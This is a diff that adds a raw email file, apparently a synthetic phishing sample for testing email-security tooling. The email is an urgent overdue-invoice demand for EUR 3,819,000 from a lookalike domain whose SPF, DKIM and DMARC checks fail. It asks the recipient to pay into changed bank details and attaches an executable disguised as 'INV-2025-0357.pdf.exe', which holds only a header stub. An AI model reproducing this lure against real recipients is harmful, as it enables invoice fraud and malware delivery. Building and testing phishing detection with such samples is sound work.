@@ -1,0 +1,73 @@
+From: "Lakeside Consulting Accounts" <billing@sbi-netbanking-kyc.top>
+To: Michael Joshi <michael.joshi@northgate-industries.com>
+Subject: Invoice attached: INV-2025-0357 (EUR 3,819,000)
+Date: Fri, 29 May 2026 22:21:00 +0000
+Message-ID: <178772093947.6.5507592964599303138@sbi-netbanking-kyc.top>
+Return-Path: <bounce-7855@sbi-netbanking-kyc.top>
+MIME-Version: 1.0
+Received: from vps-31.hosting.example (vps-31.hosting.example [198.51.100.7])
+ by mx.northgate-industries.com (Postfix) with ESMTPS id F37AEDBE9FB8 for
+ <recipient@northgate-industries.com>; Fri, 29 May 2026 22:21:00 +0000
+Received: from mail.gateway.example (mail.gateway.example [203.0.113.5]) by
+ vps-31.hosting.example (Postfix) with ESMTPS id 5C10A7E3D711; Fri, 29 May
+ 2026 22:20:44 +0000
+Received-SPF: softfail (mailfrom) identity=mailfrom; client-ip=192.0.2.44;
+ envelope-from=<bounce@sbi-netbanking-kyc.top>;
+Authentication-Results: mx.sbi-netbanking-kyc.top; spf=softfail
+ smtp.mailfrom=sbi-netbanking-kyc.top; dkim=fail
+ header.d=sbi-netbanking-kyc.top; dmarc=fail (p=reject)
+ header.from=sbi-netbanking-kyc.top
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=sbi-netbanking-kyc.top; s=selector1; t=828815196; h=from:to:subject:date;
+ bh=rqpPgGwj+jSlWAlvhckzcBtCDIJ+3kJLqcLk/d8Rws8=; =?utf-8?q?b=3Dq5u8IgSscKW8?=
+ =?utf-8?q?M4OgYdtZ3hjnMN3fp46fWmfu1xQ7tehUKsdbHP9Lx0uCrSEbmUt4Kxi/BV3G/uBp8?=
+ =?utf-8?q?Y0bu1ioQw=3D=3D?=
+Content-Type: multipart/mixed; boundary="===============4058044240520361115=="
+
+--===============4058044240520361115==
+Content-Type: multipart/alternative;
+ boundary="===============6460692578693397991=="
+
+--===============6460692578693397991==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+Hello Michael,
+
+Please find attached invoice INV-2025-0357 for EUR 3,819,000, now overdue. Ki=
+ndly
+review the attached statement and process this payment immediately to avoid
+service interruption.
+
+If the bank details have changed since your last remittance, use the updated
+account information in the attachment.
+
+Regards,
+David Fletcher
+Accounts Receivable, Lakeside Consulting
+
+--===============6460692578693397991==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<html><body style=3D"font-family:Segoe UI,Arial,sans-serif;font-size:14px;col=
+or:#202124"><p>Hello Michael,</p><p>Please find attached invoice INV-2025-035=
+7 for EUR 3,819,000, now overdue. Kindly review the attached statement and pr=
+ocess this payment immediately to avoid service interruption.</p><p>If the ba=
+nk details have changed since your last remittance, use the updated account i=
+nformation in the attachment.</p><p>Regards, David Fletcher Accounts Receivab=
+le, Lakeside Consulting</p></body></html>
+
+--===============6460692578693397991==--
+
+--===============4058044240520361115==
+Content-Type: application/octet-stream
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="INV-2025-0357.pdf.exe"
+MIME-Version: 1.0
+
+TVqQAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFRo
+aXMgcHJvZ3JhbSBjYW5ub3QgYmUgcnVuIGluIERPUyBtb2Rl
+
+--===============4058044240520361115==--
